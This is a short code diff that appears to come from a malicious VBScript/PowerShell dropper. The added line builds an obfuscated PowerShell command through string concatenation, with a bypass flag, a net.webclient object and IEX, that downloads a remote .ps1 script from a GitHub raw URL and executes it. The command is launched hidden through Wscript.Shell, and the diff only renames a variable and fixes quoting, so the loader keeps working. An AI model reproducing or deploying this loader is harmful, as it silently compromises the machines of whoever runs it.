@@ -45,7 +45,7 @@ hctixwichs=" bYpaSs -c"
 
 
 
-aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" $U"+"n"+"lpBj"+"Ckjw"+"i ="+" (ne"+"w-ob"+"jec"+"t "+"net.we"+"bclien"+"t); "+"IeX ($UnlpBjCkjwi.downloadstring('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib706.ps1''))"
+aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" $S"+"c"+"MutM"+"mNQE"+" = "+"(new"+"-obj"+"ect"+" n"+"et.web"+"client"+"); I"+"eX ($ScMutMmNQE.downloadstring('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib706.ps1'))"
 CreateObject("Wscript."+ksayewnds).Run aiensjd, 0, false
 '@
 Start-Sleep -s 3
